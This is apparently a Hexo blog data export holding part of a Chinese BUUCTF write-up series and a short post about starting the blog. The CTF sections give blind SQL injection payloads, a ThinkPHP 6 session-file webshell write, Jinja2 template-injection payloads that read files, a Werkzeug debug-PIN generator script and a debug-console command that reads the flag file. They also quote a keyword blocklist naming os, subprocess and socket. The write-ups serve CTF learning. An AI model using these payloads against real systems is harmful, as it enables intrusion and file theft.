class="hljs-number">0</span>%<span class="hljs-number">23</span><br><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span>^<span class="hljs-number">1</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404135535230.png" alt="image-20210404135535230"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404135616538.png" alt="image-20210404135616538"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404135712369.png" alt="image-20210404135712369"></p><p>返回错误</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404135756770.png" alt="image-20210404135756770"></p><p>返回正确。</p><p>发现存在注入。</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404140526716.png" alt="image-20210404140526716"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404140614551.png" alt="image-20210404140614551"></p><p>接下来就构造注入语句，因为过滤了or，所以无法使用<code>information_schema</code></p><p>绕过函数：</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">sys.schem<span class="hljs-built_in">a_auto</span>_increment_columns<br>sys.schem<span class="hljs-built_in">a_table</span>_statistics_with_buffer<br>sys.x$schem<span class="hljs-built_in">a_table</span>_statistics_with_buffer<br>sys.x$schem<span class="hljs-built_in">a_flattened</span>_keys<br>join无列名注入<br></code></pre></td></tr></table></figure><p>构造查表语句：</p><p>判断逻辑：返回Nu1L说明payload为1对，语句成立</p><p>返回Error Occured When Fetch Result payload为0，语句不成立</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">查表名：<br>id=<span class="hljs-number">1</span>^(ascii(substr((<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> sys.x$schema_table_statistics_with_buffer <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()),&#123;&#125;,<span class="hljs-number">1</span>))=&#123;&#125;)^<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404152201048.png" alt="image-20210404152201048"></p><p>可见表名：f1ag_1s_h3r3_hhhhh</p><p>下面用无列名注入，利用到了ascii位偏移：</p><p>两个字符串比较时利用首字符的ascii码</p><p>核心payload：<code>(select &#39;admin&#39;,&#39;admin&#39;)&gt;(select * from users limit 1)</code></p><p>//子查询之间也可以直接通过<code>&gt;、&lt;、=</code>来进行判断。</p><p>测试字段：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">select</span> <span class="hljs-number">1</span><br><span class="hljs-attribute">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span><br><span class="hljs-attribute">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404160620528.png" alt="image-20210404160620528"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404160633320.png" alt="image-20210404160633320"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404160645953.png" alt="image-20210404160645953"></p><p>构造payload：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span>^((select <span class="hljs-number">1</span>,&#x27;f&#x27;)&gt;(select * from f<span class="hljs-number">1</span>ag_<span class="hljs-number">1</span>s_h<span class="hljs-number">3</span>r<span class="hljs-number">3</span>_hhhhh))^<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404160225767.png" alt="image-20210404160225767"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404160241590.png" alt="image-20210404160241590"></p><p>可见<code>Nu1L</code>页面的上一位就是我们要查询的值.</p><h4 id="Getflag-1"><a href="#Getflag-1" class="headerlink" title="Getflag"></a>Getflag</h4><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404160710227.png" alt="image-20210404160710227"></p><p>成功查询到flag。</p><h3 id="WEB-EasyThinking"><a href="#WEB-EasyThinking" class="headerlink" title="[WEB]EasyThinking"></a>[WEB]EasyThinking</h3><h4 id="题目分析-4"><a href="#题目分析-4" class="headerlink" title="题目分析"></a>题目分析</h4><p>题目存在注册，登录，搜索功能，注册后登录搜索测试，发现个人中心会显示搜索记录。根据首页信息：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419105854.png" alt="image-20210419105853980"></p><p>猜测搜索处存在利用点。扫描目录发现存在<code>www.zip</code>，下载源码审计，发现是TP框架，找到功能点核心代码：发现search 处session存储，同时TP是6.0版本：</p><p>参考：<a href="https://paper.seebug.org/1114/">https://paper.seebug.org/1114/</a></p><p>参考：<a href="https://xz.aliyun.com/t/8409">https://xz.aliyun.com/t/8409</a></p><p>TP6session文件存储存在的任意文件操作漏洞，我们可以写入shell，文件路径<code>\runtime\session</code>，文件名为32位就可以，构造后缀为<code>.php</code>的32位字符串，访问<code>sess_</code>+文件名</p><h4 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>从注册的时候开始修改：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419140614.png" alt="image-20210419140614233"></p><p>注册后<code>search</code> 页面 提交key，先写入<code>&lt;?php phpinfo();?&gt;</code></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419141031.png" alt="image-20210419141030952"></p><p>然后访问看下：<code>http://xx/runtime/session/sess_b1d19886ab14c0d8340ddf637c17.php</code></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419141426.png" alt="image-20210419141426271"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419142246.png" alt="image-20210419142246746"></p><p>写入一句话，蚁剑连接发现执行不了命令，看下phpinfo：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419141512.png" alt="image-20210419141512122"></p><p>发现需要bypass disable_functions，php版本为7.3，直接利用蚁剑插件 php7-Backtrace-UAF bypass:</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419145536.png" alt="image-20210419145536851"></p><h3 id="WEB-FlaskApp"><a href="#WEB-FlaskApp" class="headerlink" title="[WEB]FlaskApp"></a>[WEB]FlaskApp</h3><h4 id="题目分析-5"><a href="#题目分析-5" class="headerlink" title="题目分析"></a>题目分析</h4><p>根据题目提示是个flask的base64加密、解密程序，加密结果会在首页显示，还存在一个hint页面：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419150702.png" alt="image-20210419150702201"></p><p>查看源码发现提示<code>PIN</code> 猜测可能是Flask debug Pin码攻击，现在重点就是结合其他漏洞获取必要信息，通过反复测试发现解密的时候输入非base64，识别不了就会报错，同时可以查看部分源码：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419151659.png" alt="image-20210419151659872"></p><p>可以看到如果输入的值解密后能够绕过waf，那么就会执行。那么现在的思路就是构造payload然后base64加密，之后解密执行。</p><h4 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>采用if条件语句防止被过滤：</p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> c.__name__==&#x27;catch_warnings&#x27; %&#125;</span><br><span class="hljs-template-variable">&#123;&#123; </span><br><span class="hljs-template-variable">c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;app.py&#x27;, &#x27;r&#x27;).read()</span><br><span class="hljs-template-variable">&#125;&#125;</span><br><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><br><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br><br><span class="xml">eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX0NCnslIGlmIGMuX19uYW1lX189PSdjYXRjaF93YXJuaW5ncycgJX0NCnt7IA0KYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignYXBwLnB5JywgJ3InKS5yZWFkKCkNCn19DQp7JSBlbmRpZiAlfQ0KeyUgZW5kZm9yICV9</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419154846.png" alt="image-20210419154846170"></p><p>可以得到源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,render_template_string<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template,request,flash,redirect,url_for<br><span class="hljs-keyword">from</span> flask_wtf <span class="hljs-keyword">import</span> FlaskForm<br><span class="hljs-keyword">from</span> wtforms <span class="hljs-keyword">import</span> StringField, SubmitField<br><span class="hljs-keyword">from</span> wtforms.validators <span class="hljs-keyword">import</span> DataRequired<br><span class="hljs-keyword">from</span> flask_bootstrap <span class="hljs-keyword">import</span> Bootstrap<br><span class="hljs-keyword">import</span> base64<br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-string">&#x27;s_e_c_r_e_t_k_e_y&#x27;</span><br>bootstrap = Bootstrap(app)<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NameForm</span>(<span class="hljs-params">FlaskForm</span>):</span><br>    text = StringField(<span class="hljs-string">&#x27;BASE64加密&#x27;</span>,validators= [DataRequired()])<br>    submit = SubmitField(<span class="hljs-string">&#x27;提交&#x27;</span>)<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NameForm1</span>(<span class="hljs-params">FlaskForm</span>):</span><br>    text = StringField(<span class="hljs-string">&#x27;BASE64解密&#x27;</span>,validators= [DataRequired()])<br>    submit = SubmitField(<span class="hljs-string">&#x27;提交&#x27;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):</span><br>    black_list = [<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;os&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;import&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;chr&quot;</span>,<span class="hljs-string">&quot;request&quot;</span>,<br>                  <span class="hljs-string">&quot;subprocess&quot;</span>,<span class="hljs-string">&quot;commands&quot;</span>,<span class="hljs-string">&quot;socket&quot;</span>,<span class="hljs-string">&quot;hex&quot;</span>,<span class="hljs-string">&quot;base64&quot;</span>,<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>]<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> black_list :<br>        <span class="hljs-keyword">if</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>.lower() :<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hint</span>():</span><br>    txt = <span class="hljs-string">&quot;失败乃成功之母！！&quot;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;hint.html&quot;</span>,txt = txt)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode</span>():</span><br>    <span class="hljs-keyword">if</span> request.values.get(<span class="hljs-string">&#x27;text&#x27;</span>) :<br>        text = request.values.get(<span class="hljs-string">&quot;text&quot;</span>)<br>        text_decode = base64.b64encode(text.encode())<br>        tmp = <span class="hljs-string">&quot;结果  :&#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">str</span>(text_decode.decode()))<br>        res =  render_template_string(tmp)<br>        flash(tmp)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;encode&#x27;</span>))<br>    <span class="hljs-keyword">else</span> :<br>        text = <span class="hljs-string">&quot;&quot;</span><br>        form = NameForm(text)<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>,form = form ,method = <span class="hljs-string">&quot;加密&quot;</span> ,img = <span class="hljs-string">&quot;flask.png&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode</span>():</span><br>    <span class="hljs-keyword">if</span> request.values.get(<span class="hljs-string">&#x27;text&#x27;</span>) :<br>        text = request.values.get(<span class="hljs-string">&quot;text&quot;</span>)<br>        text_decode = base64.b64decode(text.encode())<br>        tmp = <span class="hljs-string">&quot;结果 ： &#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(text_decode.decode())<br>        <span class="hljs-keyword">if</span> waf(tmp) :<br>            flash(<span class="hljs-string">&quot;no no no !!&quot;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;decode&#x27;</span>))<br>        res =  render_template_string(tmp)<br>        flash( res )<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;decode&#x27;</span>))<br>    <span class="hljs-keyword">else</span> :<br>        text = <span class="hljs-string">&quot;&quot;</span><br>        form = NameForm1(text)<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>,form = form, method = <span class="hljs-string">&quot;解密&quot;</span> , img = <span class="hljs-string">&quot;flask1.png&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">not_found</span>(<span class="hljs-params">name</span>):</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;404.html&quot;</span>,name = name)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">5000</span>, debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs prolog">[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-string">&#x27;s_e_c_r_e_t_k_e_y&#x27;</span><br></code></pre></td></tr></table></figure><p>重点在waf：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):</span><br>    black_list = [<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;os&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;import&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;chr&quot;</span>,<span class="hljs-string">&quot;request&quot;</span>,<br>                  <span class="hljs-string">&quot;subprocess&quot;</span>,<span class="hljs-string">&quot;commands&quot;</span>,<span class="hljs-string">&quot;socket&quot;</span>,<span class="hljs-string">&quot;hex&quot;</span>,<span class="hljs-string">&quot;base64&quot;</span>,<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>]<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> black_list :<br>        <span class="hljs-keyword">if</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>.lower() :<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>可见过滤了命令执行常用函数，不能采用命令执行的方式。</p><p>继续读一下必要信息：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs awk">username <span class="hljs-comment">#读取/etc/passwd</span><br><span class="hljs-regexp">//</span>本题：flaskweb<br>modname  <span class="hljs-comment">#flask.app</span><br>getattr(app, <span class="hljs-string">&#x27;__name__&#x27;</span>, getattr(app.__class__, <span class="hljs-string">&#x27;__name__&#x27;</span>))为Flask<br>getattr(mod, <span class="hljs-string">&#x27;__file__&#x27;</span>, None)为flask目录下的一个app.py的绝对路径<br><span class="hljs-regexp">//</span>本题通过报错得到路径：<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/lib/</span>python3.<span class="hljs-number">7</span><span class="hljs-regexp">/site-packages/</span>flask/app.py<br>uuid.getnode()就是当前电脑的MAC地址，str(uuid.getnode())则是mac地址的十进制表达式<br><span class="hljs-regexp">//</span>获取方式：<span class="hljs-regexp">/sys/</span>class<span class="hljs-regexp">/net/</span>eth0/address<br><span class="hljs-regexp">//</span>本题：<span class="hljs-number">02</span>:<span class="hljs-number">42</span>:ac:<span class="hljs-number">10</span>:af:<span class="hljs-number">49</span> 转化为十进制(python print(<span class="hljs-number">0</span>x0242ac10af49)) <span class="hljs-number">2485377871689</span><br>get_machine_id()<br><span class="hljs-regexp">//</span>读取<span class="hljs-regexp">/etc/m</span>achine-id或者 <span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>random/boot_i中的值<br><span class="hljs-regexp">//</span>windows读取注册表：SOFTWARE\\Microsoft\\Cryptography<br><span class="hljs-regexp">//</span>docker下：<span class="hljs-regexp">/proc/</span>self/cgroup<br><span class="hljs-regexp">//</span>本题：<span class="hljs-number">0</span>f9cec5a9c55ef59cc02311c79ae092fb42cafa6e918bac08ea04a94f320c249<br></code></pre></td></tr></table></figure><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*-coding:utf-8</span><br><span class="hljs-comment"># From https://xz.aliyun.com/t/2553</span><br><br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br>probably_public_bits = [<br>    <span class="hljs-string">&#x27;flaskweb&#x27;</span>,<span class="hljs-comment"># username</span><br>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,<span class="hljs-comment"># modname</span><br>    <span class="hljs-string">&#x27;Flask&#x27;</span>,<span class="hljs-comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span><br>    <span class="hljs-string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="hljs-comment"># getattr(mod, &#x27;__file__&#x27;, None),</span><br>]<br><br>private_bits = [<br>    <span class="hljs-string">&#x27;2485377871689&#x27;</span>,<span class="hljs-comment">#str(uuid.getnode()), /sys/class/net/ens0/address</span><br>    <span class="hljs-string">&#x27;0f9cec5a9c55ef59cc02311c79ae092fb42cafa6e918bac08ea04a94f320c249&#x27;</span><span class="hljs-comment"># get_machine_id(), /etc/machine-id</span><br>]<br><br>h = hashlib.md5()<br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    h.update(bit)<br>h.update(<span class="hljs-string">b&#x27;cookiesalt&#x27;</span>)<br><br>cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]<br><br>num = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    h.update(<span class="hljs-string">b&#x27;pinsalt&#x27;</span>)<br>    num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % <span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]<br><br>rv =<span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>            rv = <span class="hljs-string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)<br>                          <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        rv = num<br><br><span class="hljs-built_in">print</span>(rv)<br></code></pre></td></tr></table></figure><p>信息修改完整后运行得到 pin码：<code>410-898-797</code></p><p>读文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br>os.listdir(<span class="hljs-string">&#x27;/&#x27;</span>)<br>os.popen(<span class="hljs-string">&#x27;cat /this_is_the_flag.txt&#x27;</span>).readlines()<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419200901.png" alt="image-20210419200900612"></p><p>有大佬直接利用读文件非预期了，我们知道可以读取任意文件，Payload：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__bases__</span>[0].__subclasses__()[75].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](<span class="hljs-name">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>).listdir(<span class="hljs-name">&#x27;/&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419210056.png" alt="image-20210419210055982"></p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;<br>&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;<br>&#123;&#123; <br>c.__init__.__globals__[&#x27;__builtins__&#x27;].open(<span class="hljs-name">&#x27;txt.galf_eht_si_siht/&#x27;</span>[<span class="hljs-symbol">::-1</span>], &#x27;r&#x27;).read()<br>&#125;&#125;<br>&#123;% endif %&#125;<br>&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419201816.png" alt="image-20210419201816421"></p>]]></content>
    
    
    <categories>
      
      <category>Writeup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>buuctf</tag>
      
      <tag>Writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>This is the first blog</title>
    <link href="/2021/04/18/The_first_blog/"/>
    <url>/2021/04/18/The_first_blog/</url>
    
    <content type="html"><![CDATA[<h2 id="This-is-the-first-blog"><a href="#This-is-the-first-blog" class="headerlink" title="This is the first blog"></a>This is the first blog</h2><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>学生时代马上结束了，服务器也到期了</p><p>又回到了刚接触网络安全的时候所采用的的低成本方式：Github+Hexo</p><p>博客用于记录自己的一些学习笔记，方便梳理自己的知识体系，同时也通过写博客来督促自己完成学习任务，减少一些DDL</p><p>去年一年准备各种考试，技术方面落下了不少，正在恶补的同时希望能够继续提升自己</p><p>That’s all………</p><h3 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h3><p>基于对Material Design 风格的热爱，采用<a href="https://hexo.fluid-dev.com/docs/">Fluid</a>主题</p><p>主题 GitHub: <a href="https://github.com/fluid-dev/hexo-theme-fluid">https://github.com/fluid-dev/hexo-theme-fluid</a></p><p>主题文档：<a href="https://hexo.fluid-dev.com/docs/start/">https://hexo.fluid-dev.com/docs/start/</a></p><p>安装方便，Hexo 5.0.0 版本以上，通过 npm 直接安装：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">npm install <span class="hljs-comment">--save hexo-theme-fluid</span><br></code></pre></td></tr></table></figure><p>博客目录下创建<code>_config.fluid.yml</code>文件，copy github的内容，根据自己的需要修改配置。</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
